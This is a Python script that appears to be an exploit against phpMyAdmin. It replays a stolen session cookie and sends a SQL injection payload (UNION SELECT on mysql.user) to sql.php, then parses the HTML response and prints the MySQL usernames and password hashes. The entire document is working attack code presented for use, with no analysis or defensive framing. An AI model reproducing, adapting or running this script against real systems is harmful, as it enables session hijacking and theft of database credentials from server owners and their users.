import requests
from bs4 import BeautifulSoup

# Target URL
target = "http://localhost/phpmyadmin/"
session_cookie = "STOLEN_SESSION_ID"  # Replace with the stolen session ID

# Malicious payload to extract MySQL credentials
payload = {
    'db': 'mysql',
    'table': 'user',
    'sql_query': "' UNION SELECT User,Password,3 FROM mysql.user -- "
}

# Set the session cookie for authenticated requests
headers = {'Cookie': f'phpMyAdmin={session_cookie}'}

# Send the GET request to execute the query
response = requests.get(f"{target}sql.php", params=payload, headers=headers)

# Print the raw HTML response to debug
print("Response text:")
print(response.text)

# Parse the response to extract MySQL credentials
soup = BeautifulSoup(response.text, 'html.parser')

# Find all the cells with class 'data'
results = soup.find_all('td', class_='data')

if results:
    print("[+] MySQL Credentials:")
    for i in range(0, len(results), 2):
        print(f"User: {results[i].text} | Hash: {results[i+1].text}")
else:
    print("[-] No results found. Check if the table and columns exist in the 'mysql.user' table.")
